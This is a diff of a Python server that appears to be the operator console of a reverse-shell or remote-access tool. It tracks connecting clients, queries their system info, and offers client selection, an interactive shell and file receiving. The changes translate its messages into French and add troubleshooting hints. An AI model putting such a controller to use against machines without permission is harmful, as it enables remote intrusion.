@@ -102,20 +102,44 @@ def clear_screen():
     print_status()
 
 def setup_server(host, port):
-    """Set up and start the server"""
+    """Configure et démarre le serveur."""
     global server_status
-    
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
+
     try:
         server.bind((host, port))
         server.listen(5)
         server_status = "listening"
-        print(f"{Colors.GREEN}[+] Server listening on {host}:{port}{Colors.END}")
+        print(f"{Colors.GREEN}[+] Serveur en écoute sur {host}:{port}{Colors.END}")
         return server
+    except PermissionError:
+        print(f"{Colors.RED}[❌] Impossible de démarrer le serveur sur {host}:{port}{Colors.END}")
+        print(f"{Colors.YELLOW}    Cause : permission refusée.{Colors.END}")
+        print(f"{Colors.YELLOW}    Solutions :{Colors.END}")
+        print(f"        1. Les ports < 1024 nécessitent les droits administrateur.")
+        print(f"        2. Essayez un port > 1024, ex: 4444, 5555, 8888.")
+        print(f"        3. Sur Linux/Mac : utilisez 'sudo python server.py'.")
+        sys.exit(1)
+    except OSError as e:
+        if e.errno in (98, 10048):  # Address already in use
+            print(f"{Colors.RED}[❌] Le port {port} est déjà utilisé par une autre application.{Colors.END}")
+            print(f"{Colors.YELLOW}    Solutions :{Colors.END}")
+            print(f"        1. Arrêtez l'application qui utilise le port {port}.")
+            print(f"        2. Choisissez un port différent (ex: 5555, 8888, 9999).")
+            print(f"        3. Windows : vérifiez avec 'netstat -ano | findstr {port}'.")
+            print(f"        4. Linux   : vérifiez avec 'ss -tlnp | grep {port}'.")
+        else:
+            print(f"{Colors.RED}[❌] Impossible de démarrer le serveur sur {host}:{port}{Colors.END}")
+            print(f"{Colors.YELLOW}    Cause : {e}{Colors.END}")
+            print(f"{Colors.YELLOW}    Solutions :{Colors.END}")
+            print(f"        1. Vérifiez que le port {port} n'est pas bloqué par le pare-feu.")
+            print(f"        2. Essayez un autre port (ex: 5555, 8888).")
+            print(f"        3. Vérifiez vos permissions réseau.")
+        sys.exit(1)
     except Exception as e:
-        print(f"{Colors.RED}[!] Error starting server: {e}{Colors.END}")
+        print(f"{Colors.RED}[❌] Erreur inattendue au démarrage du serveur : {e}{Colors.END}")
         sys.exit(1)
 
 def accept_connections(server):
@@ -127,35 +151,37 @@ def accept_connections(server):
         try:
             client_socket, address = server.accept()
             client_socket.setblocking(1)
-            
-            # Get client system information for identification
+
+            # Récupération des informations du client
             client_socket.send("sysinfo".encode())
             client_info = client_socket.recv(1024).decode()
-            
-            # Assign client ID
+
+            # Attribution de l'ID client
             client_id = len(clients) + 1
             clients[client_id] = {
                 "socket": client_socket,
                 "address": address,
                 "info": client_info
             }
-            
-            # Notify about new connection
-            print(f"\n{Colors.GREEN}[+] New connection established:{Colors.END} {address[0]}:{address[1]} (ID: {client_id})")
-            print(f"{Colors.GREEN}[+] Client info:{Colors.END} {client_info}")
+
+            print(f"\n{Colors.GREEN}[+] Nouvelle connexion établie :{Colors.END} {address[0]}:{address[1]} (ID: {client_id})")
+            print(f"{Colors.GREEN}[+] Infos client :{Colors.END} {client_info}")
             print(print_menu(), end="", flush=True)
-            
+
         except Exception as e:
             if not stop_flag:
-                print(f"\n{Colors.RED}[!] Error accepting connection: {e}{Colors.END}")
+                print(f"\n{Colors.RED}[❌] Erreur d'acceptation de connexion : {e}{Colors.END}")
+                print(f"{Colors.YELLOW}    Vérifiez que le pare-feu autorise le port et que le réseau est actif.{Colors.END}")
                 break
 
 def send_command(command):
-    """Send command to the current client"""
+    """Envoie une commande au client actif."""
     global current_client
-    
+
     if not current_client:
-        print(f"{Colors.RED}[!] No client selected. Use 'select <id>' first.{Colors.END}")
+        print(f"{Colors.RED}[❌] Aucun client sélectionné.{Colors.END}")
+        print(f"{Colors.YELLOW}    Utilisez 'list' pour voir les clients disponibles.{Colors.END}")
+        print(f"{Colors.YELLOW}    Utilisez 'select <id>' pour sélectionner un client.{Colors.END}")
         return None
     
     try:
@@ -240,7 +266,9 @@ def send_command(command):
             return response
             
     except Exception as e:
-        print(f"{Colors.RED}[!] Error communicating with client: {e}{Colors.END}")
+        print(f"{Colors.RED}[❌] Erreur de communication avec le client : {e}{Colors.END}")
+        print(f"{Colors.YELLOW}    Le client s'est peut-être déconnecté.{Colors.END}")
+        print(f"{Colors.YELLOW}    Utilisez 'list' pour voir les clients encore actifs.{Colors.END}")
         return None
 
 def format_system_info(info_string):
@@ -288,9 +316,10 @@ def receive_file(client_socket):
         return None
 
 def list_clients():
-    """List all connected clients"""
+    """Liste tous les clients connectés."""
     if not clients:
-        print(f"{Colors.YELLOW}[!] No clients connected{Colors.END}")
+        print(f"{Colors.YELLOW}[!] Aucun client connecté pour l'instant.{Colors.END}")
+        print(f"{Colors.YELLOW}    Assurez-vous que le serveur est en écoute et qu'un client est exécuté.{Colors.END}")
         return
         
     print(f"\n{Colors.BOLD}Connected Clients:{Colors.END}")
@@ -317,11 +346,12 @@ def list_clients():
     print()
 
 def handle_shell_mode(client_id):
-    """Handle interactive shell mode with a client"""
+    """Gère le mode shell interactif avec un client."""
     global current_client, prompt_symbol
-    
+
     if client_id not in clients:
-        print(f"{Colors.RED}[!] Client ID {client_id} not found{Colors.END}")
+        print(f"{Colors.RED}[❌] Client ID {client_id} introuvable.{Colors.END}")
+        print(f"{Colors.YELLOW}    Utilisez 'list' pour voir les ID disponibles.{Colors.END}")
         return
     
     current_client = clients[client_id]
@@ -447,8 +477,12 @@ def main():
                 try:
                     client_id = int(cmd.split(" ")[1])
                     handle_shell_mode(client_id)
-                except (IndexError, ValueError):
-                    print(f"{Colors.RED}[!] Invalid command format. Use 'select <id>'{Colors.END}")
+                except IndexError:
+                    print(f"{Colors.RED}[❌] Format invalide. Utilisez 'select <id>'.{Colors.END}")
+                    print(f"{Colors.YELLOW}    Exemple : select 1{Colors.END}")
+                except ValueError:
+                    print(f"{Colors.RED}[❌] L'ID doit être un nombre entier.{Colors.END}")
+                    print(f"{Colors.YELLOW}    Exemple : select 1{Colors.END}")
                     
             elif cmd == "exit":
                 stop_flag = True
@@ -478,7 +512,8 @@ def main():
                 if result:
                     print(result)
             else:
-                print(f"{Colors.RED}[!] Unknown command: '{cmd}'. Type 'help' to see available commands.{Colors.END}")
+                print(f"{Colors.RED}[❌] Commande inconnue : '{cmd}'.{Colors.END}")
+                print(f"{Colors.YELLOW}    Tapez 'help' pour voir les commandes disponibles.{Colors.END}")
                 
         except KeyboardInterrupt:
             print(f"\n{Colors.YELLOW}[!] Press Ctrl+C again to exit or type 'exit'{Colors.END}")
